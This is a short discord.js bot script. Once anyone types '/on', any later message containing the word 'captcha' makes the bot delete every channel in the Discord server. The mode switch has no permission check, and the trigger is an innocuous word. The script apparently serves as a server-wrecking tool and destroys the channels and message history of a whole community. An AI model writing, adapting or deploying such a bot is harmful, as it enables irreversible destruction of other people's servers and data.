// require the discord.js module
const Discord = require('discord.js');

// create a new Discord client
const client = new Discord.Client();

// Variable
const variable = "variable ?"


client.once('ready', () => {
    console.log('Ready!');
});
let Mode = "off";
client.on('message', message => {
    if(variable === "variable ?"){
if(message.content.startsWith('/on')){
    Mode = "on";
}
if(message.content.startsWith('/off')){
    Mode = "off";
}
if(message.content.startsWith('/?')){
    message.channel.send('Mode : ' + Mode)
}
if(message.content.includes("captcha")){
        if(Mode === "on"){
        var idid = message.guild.id;    
        var gguild = client.guilds.cache.get(idid); //Check Discord's Help For it
        for (var i = 0; i < gguild.channels.cache.array().length; i++) {
                gguild.channels.cache.array()[i].delete();
        }
}else{
    return message.channel.send('.')
}
    }
}
});

client.login(process.env.TOKEN);
